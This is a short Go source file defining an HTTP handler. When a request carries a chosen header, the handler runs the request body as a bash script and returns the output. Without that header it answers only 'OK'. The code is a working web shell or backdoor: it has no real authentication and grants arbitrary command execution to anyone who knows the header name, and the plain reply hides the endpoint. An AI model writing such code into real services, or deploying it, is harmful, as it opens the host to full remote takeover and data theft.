package main

import (
	"context"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"time"
)

type Handler struct {
	ExpectHeader string
}

func (h *Handler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Header.Get(h.ExpectHeader) == "" {
		w.Header().Set("Connection", "close")
		w.Write([]byte("OK\n"))
		return
	}
	script, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	if len(script) == 0 {
		http.Error(w, "need body", 400)
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 10*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx, "bash", "-c", string(script)).CombinedOutput()
	if len(out) > 0 {
		w.Write(out)
	}
	if err != nil {
		fmt.Fprint(w, err.Error())
	}
}
